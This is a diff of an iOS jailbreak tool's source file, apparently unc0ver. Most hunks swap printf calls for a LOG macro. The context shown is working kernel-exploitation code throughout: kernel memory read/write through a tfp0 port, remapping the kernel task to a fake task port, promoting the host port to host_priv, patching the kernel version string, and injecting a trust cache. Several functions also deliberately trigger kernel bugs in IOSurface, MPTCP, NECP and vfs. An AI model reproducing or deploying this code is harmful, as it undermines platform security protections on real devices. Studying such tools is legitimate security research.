@@ -299,7 +299,7 @@ static vm_address_t get_kernel_base(mach_port_t tfp0)
         if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
             int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
             if (ret != KERN_SUCCESS) {
-                printf("Failed vm_read %i\n", ret);
+                LOG("Failed vm_read %i\n", ret);
                 goto next;
             }
             
@@ -308,7 +308,7 @@ static vm_address_t get_kernel_base(mach_port_t tfp0)
                 int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                 
                 if (ret != KERN_SUCCESS) {
-                    printf("Failed vm_read %i\n", ret);
+                    LOG("Failed vm_read %i\n", ret);
                     exit(-1);
                 }
                 if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
@@ -327,7 +327,7 @@ char *copyBootHash(void)
     io_registry_entry_t chosen = IORegistryEntryFromPath(kIOMasterPortDefault, "IODeviceTree:/chosen");
     
     if (!MACH_PORT_VALID(chosen)) {
-        printf("Unable to get IODeviceTree:/chosen port\n");
+        LOG("Unable to get IODeviceTree:/chosen port\n");
         return NULL;
     }
     
@@ -336,12 +336,12 @@ char *copyBootHash(void)
     IOObjectRelease(chosen);
     
     if (hash == nil) {
-        fprintf(stderr, "Unable to read boot-manifest-hash\n");
+        LOG("Unable to read boot-manifest-hash\n");
         return NULL;
     }
     
     if (CFGetTypeID(hash) != CFDataGetTypeID()) {
-        fprintf(stderr, "Error hash is not data type\n");
+        LOG("Error hash is not data type\n");
         CFRelease(hash);
         return NULL;
     }
@@ -356,7 +356,7 @@ char *copyBootHash(void)
     CFRelease(hash);
     
     if (ret != ERR_SUCCESS) {
-        printf("Unable to generate bootHash string\n");
+        LOG("Unable to generate bootHash string\n");
         free(manifestHash);
         return NULL;
     }
@@ -387,7 +387,7 @@ find_gadget_candidate(
     for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
         void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
         if (found_at != NULL){
-            printf("found at: %llx\n", (uint64_t)found_at);
+            LOG("found at: %llx\n", (uint64_t)found_at);
             return (uint64_t)found_at;
         }
     }
@@ -433,7 +433,7 @@ kread(uint64_t where, void *p, size_t size)
         }
         rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
         if (rv || sz == 0) {
-            fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
+            LOG("[e] error reading kernel @%p\n", (void *)(offset + where));
             break;
         }
         offset += sz;
@@ -453,7 +453,7 @@ kwrite(uint64_t where, const void *p, size_t size)
         }
         rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (mach_msg_type_number_t)chunk);
         if (rv) {
-            fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
+            LOG("[e] error writing kernel @%p\n", (void *)(offset + where));
             break;
         }
         offset += chunk;
@@ -474,20 +474,20 @@ uint64_t zm_fix_addr(uint64_t addr, uint64_t zone_map_ref) {
     if (zm_hdr.start == 0) {
         // xxx rk64(0) ?!
         // uint64_t zone_map_ref = find_zone_map_ref();
-        fprintf(stderr, "zone_map_ref: %llx \n", zone_map_ref);
+        LOG("zone_map_ref: %llx \n", zone_map_ref);
         uint64_t zone_map = rk64(zone_map_ref);
-        fprintf(stderr, "zone_map: %llx \n", zone_map);
+        LOG("zone_map: %llx \n", zone_map);
         // hdr is at offset 0x10, mutexes at start
         size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
-        fprintf(stderr, "zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
+        LOG("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)\n", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
         
         if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
-            fprintf(stderr, "kread of zone_map failed!\n");
+            LOG("kread of zone_map failed!\n");
             exit(1);
         }
         
         if (zm_hdr.end - zm_hdr.start > 0x100000000) {
-            fprintf(stderr, "zone_map is too big, sorry.\n");
+            LOG("zone_map is too big, sorry.\n");
             exit(1);
         }
     }
@@ -610,11 +610,11 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
         }
         
         if (kernel_task_kaddr == 0) {
-            printf("[remap_kernel_task] failed to find kernel task\n");
+            LOG("[remap_kernel_task] failed to find kernel task\n");
             return 1;
         }
         
-        printf("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
+        LOG("[remap_kernel_task] kernel task at 0x%llx\n", kernel_task_kaddr);
     }
     
     mach_port_t zm_fake_task_port = MACH_PORT_NULL;
@@ -627,7 +627,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     }
     
     if (ret != KERN_SUCCESS) {
-        printf("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
+        LOG("[remap_kernel_task] unable to allocate ports: 0x%x (%s)\n", ret, mach_error_string(ret));
         return 1;
     }
     
@@ -661,31 +661,31 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     
     
     if (ret != KERN_SUCCESS) {
-        printf("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
+        LOG("[remap_kernel_task] remap failed: 0x%x (%s)\n", ret, mach_error_string(ret));
         return 1;
     }
     
     if (kernel_task_kaddr == remapped_task_addr) {
-        printf("[remap_kernel_task] remap failure: addr is the same after remap\n");
+        LOG("[remap_kernel_task] remap failure: addr is the same after remap\n");
         return 1;
     }
     
-    printf("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
+    LOG("[remap_kernel_task] remapped successfully to 0x%llx\n", remapped_task_addr);
     
     ret = mach_vm_wire(host_priv, km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
     
     if (ret != KERN_SUCCESS) {
-        printf("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
+        LOG("[remap_kernel_task] wire failed: 0x%x (%s)\n", ret, mach_error_string(ret));
         return 1;
     }
     
     uint64_t port_kaddr = getAddressOfPort(getpid(), *port);
-    printf("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
+    LOG("[remap_kernel_task] port kaddr: 0x%llx\n", port_kaddr);
     
     make_port_fake_task_port(*port, remapped_task_addr);
     
     if (rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) != remapped_task_addr) {
-        printf("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
+        LOG("[remap_kernel_task] read back tfpzero kobject didnt match!\n");
         return 1;
     }
     
@@ -736,7 +736,7 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
         int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
         if (ret != KERN_SUCCESS) {
-            printf("Failed vm_read %i\n", ret);
+            LOG("Failed vm_read %i\n", ret);
             exit(-1);
         }
         
@@ -756,7 +756,7 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     }
     
     if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
-        printf("Error parsing kernel macho\n");
+        LOG("Error parsing kernel macho\n");
         return -1;
     }
     
@@ -764,7 +764,7 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     {
         int ret = vm_read_overwrite(tfp0, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
         if (ret != KERN_SUCCESS) {
-            printf("Failed vm_read %i\n", ret);
+            LOG("Failed vm_read %i\n", ret);
             return -1;
         }
         if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
@@ -774,7 +774,7 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     }
     
     if (!darwinTextPtr) {
-        printf("Error finding Darwin text\n");
+        LOG("Error finding Darwin text\n");
         return -1;
     }
     
@@ -784,7 +784,7 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
         int ret = vm_read_overwrite(tfp0, i, ptrSize, (vm_address_t)buf, &sz);
         if (ret != KERN_SUCCESS) {
-            printf("Failed vm_read %i\n", ret);
+            LOG("Failed vm_read %i\n", ret);
             return -1;
         }
         
@@ -795,7 +795,7 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     }
     
     if (!versionPtr) {
-        printf("Error finding _version pointer, did you already patch it?\n");
+        LOG("Error finding _version pointer, did you already patch it?\n");
         return -1;
     }
     
@@ -805,13 +805,13 @@ int updateVersionString(char *newVersionString, mach_port_t tfp0, vm_address_t k
     
     ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
     if (ret != KERN_SUCCESS) {
-        printf("Failed vm_write %i\n", ret);
+        LOG("Failed vm_write %i\n", ret);
         exit(-1);
     }
     
     ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
     if (ret != KERN_SUCCESS) {
-        printf("Failed vm_write %i\n", ret);
+        LOG("Failed vm_write %i\n", ret);
         return -1;
     }
     else {
@@ -899,7 +899,7 @@ uint64_t getVnodeAtPath(uint64_t vfs_context, const char *path, uint64_t vnode_l
     uint64_t *vpp = (uint64_t *)malloc(sizeof(uint64_t));
     int ret = _vnode_lookup(vnode_lookup, path, O_RDONLY, vpp, vfs_context);
     if (ret != 0){
-        printf("unable to get vnode from path for %s\n", path);
+        LOG("unable to get vnode from path for %s\n", path);
         free(vpp);
         return -1;
     }
@@ -931,7 +931,7 @@ int snapshot_list(const char *vol)
         for (int i=0; i<retcount; i++) {
             val_attrs_t *entry = (val_attrs_t *)bufref;
             if (entry->returned.commonattr & ATTR_CMN_NAME) {
-                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
+                LOG("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
             }
             bufref += entry->length;
         }
@@ -962,7 +962,7 @@ int snapshot_check(const char *vol, const char *name)
         for (int i=0; i<retcount; i++) {
             val_attrs_t *entry = (val_attrs_t *)bufref;
             if (entry->returned.commonattr & ATTR_CMN_NAME) {
-                printf("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
+                LOG("%s\n", (char*)(&entry->name_info) + entry->name_info.attr_dataoffset);
                 if (strstr((char*)(&entry->name_info) + entry->name_info.attr_dataoffset, name))
                     return 1;
             }
@@ -990,20 +990,20 @@ void iosurface_die() {
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     
     if (service == IO_OBJECT_NULL){
-        printf("unable to find service\n");
+        LOG("unable to find service\n");
         return;
     }
     
-    printf("got service port\n");
+    LOG("got service port\n");
     
     io_connect_t conn = MACH_PORT_NULL;
     err = IOServiceOpen(service, mach_task_self(), 0, &conn);
     if (err != KERN_SUCCESS){
-        printf("unable to get user client connection\n");
+        LOG("unable to get user client connection\n");
         return;
     }
     
-    printf("got user client: 0x%x\n", conn);
+    LOG("got user client: 0x%x\n", conn);
     
     uint64_t inputScalar[16];
     uint64_t inputScalarCnt = 0;
@@ -1026,10 +1026,10 @@ void iosurface_die() {
     mach_port_t port = MACH_PORT_NULL;
     err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
     if (err != KERN_SUCCESS) {
-        printf("failed to allocate new port\n");
+        LOG("failed to allocate new port\n");
         return;
     }
-    printf("got wake port 0x%x\n", port);
+    LOG("got wake port 0x%x\n", port);
     mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
     
     uint64_t reference[8] = {0};
@@ -1051,7 +1051,7 @@ void iosurface_die() {
                                        outputStruct,
                                        &outputStructCnt);
         
-        printf("%x\n", err);
+        LOG("%x\n", err);
     };
     
     return;
@@ -1075,7 +1075,7 @@ int vfs_die() {
     int options = 0;
     
     int err = fgetattrlist(fd, &al, attrBuf, attrBufSize, options);
-    printf("err: %d\n", err);
+    LOG("err: %d\n", err);
     return 0;
 }
 
@@ -1084,11 +1084,11 @@ int vfs_die() {
 int mptcp_die() {
     int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
     if (sock < 0) {
-        printf("socket failed\n");
+        LOG("socket failed\n");
         perror("");
         return 0;
     }
-    printf("got socket: %d\n", sock);
+    LOG("got socket: %d\n", sock);
     
     struct sockaddr* sockaddr_src = malloc(256);
     memset(sockaddr_src, 'A', 256);
@@ -1117,7 +1117,7 @@ int mptcp_die() {
                        NULL,
                        NULL);
     
-    printf("err: %d\n", err);
+    LOG("err: %d\n", err);
     
     close(sock);
     
@@ -1129,10 +1129,10 @@ int mptcp_die() {
 int necp_die() {
     int necp_fd = syscall(SYS_necp_open, 0);
     if (necp_fd < 0) {
-        printf("[-] Create NECP client failed!\n");
+        LOG("[-] Create NECP client failed!\n");
         return 0;
     }
-    printf("[*] NECP client = %d\n", necp_fd);
+    LOG("[*] NECP client = %d\n", necp_fd);
     syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
     return 0;
 }
@@ -1145,7 +1145,7 @@ int necp_die() {
 void make_host_into_host_priv() {
     uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
     uint32_t old = rk32(hostport_addr);
-    printf("old host type: 0x%08x\n", old);
+    LOG("old host type: 0x%08x\n", old);
     wk32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
 }
 
@@ -1154,11 +1154,11 @@ mach_port_t try_restore_port() {
     kern_return_t err;
     err = host_get_special_port(mach_host_self(), 0, 4, &port);
     if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
-        printf("got persisted port!\n");
+        LOG("got persisted port!\n");
         // make sure rk64 etc use this port
         return port;
     }
-    printf("unable to retrieve persisted port\n");
+    LOG("unable to retrieve persisted port\n");
     return MACH_PORT_NULL;
 }
 
@@ -1290,11 +1290,11 @@ int hasMPTCP() {
     
     int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
     if (sock < 0) {
-        printf("socket failed\n");
+        LOG("socket failed\n");
         perror("");
         return rv;
     }
-    printf("got socket: %d\n", sock);
+    LOG("got socket: %d\n", sock);
     
     struct sockaddr* sockaddr_src = malloc(sizeof(struct sockaddr));
     memset(sockaddr_src, 'A', sizeof(struct sockaddr));
@@ -1325,7 +1325,7 @@ int hasMPTCP() {
     
     rv = (errno != 1);
     
-    printf("err: %d\n", err);
+    LOG("err: %d\n", err);
     
     free(sockaddr_src);
     free(sockaddr_dst);
@@ -2463,6 +2463,7 @@ void exploit(mach_port_t tfp0,
             _assert(fclose(a) == ERR_SUCCESS, message);
             INIT_FILE("/jb/amfid_payload.dylib", 0, 0644);
         }
+        
         if (needStrap) {
             CLEAN_FILE("/jb/strap.tar.lzma");
             _assert(moveFileFromAppDir("strap.tar.lzma", "/jb/strap.tar.lzma") == ERR_SUCCESS, message);
@@ -2497,7 +2498,7 @@ void exploit(mach_port_t tfp0,
         LOG("Injecting trust cache...");
         PROGRESS(NSLocalizedString(@"Exploiting... (31/64)", nil), false, false);
         SETMESSAGE(NSLocalizedString(@"Failed to inject trust cache.", nil));
-        printf("trust_chain = 0x%llx\n", GETOFFSET(trust_chain));
+        LOG("trust_chain = 0x%llx\n", GETOFFSET(trust_chain));
         addTrustChain("/jb", GETOFFSET(trust_chain), GETOFFSET(amficache));
         if (!needResources) {
             resources = [NSArray arrayWithContentsOfFile:@"/usr/share/undecimus/injectme.plist"];
@@ -3129,6 +3130,7 @@ void exploit(mach_port_t tfp0,
         PROGRESS(NSLocalizedString(@"Exploiting... (1/64)", nil), false, false);
         mach_port_t persisted_port = try_restore_port();
         if (MACH_PORT_VALID(persisted_port)) {
+            offsets_init();
             prepare_for_rw_with_fake_tfp0(persisted_port);
         } else {
             switch ([[NSUserDefaults standardUserDefaults] integerForKey:@K_EXPLOIT]) {
@@ -3184,6 +3186,7 @@ void exploit(mach_port_t tfp0,
     } else if (isSupportedByJailbreak() != true) {
         PROGRESS(NSLocalizedString(@"Unsupported", nil), false, true);
     }
+    LOG(ADDR, (uint64_t)0xFFFFFFF00776E6E0);
 }
 
 - (void)didReceiveMemoryWarning {
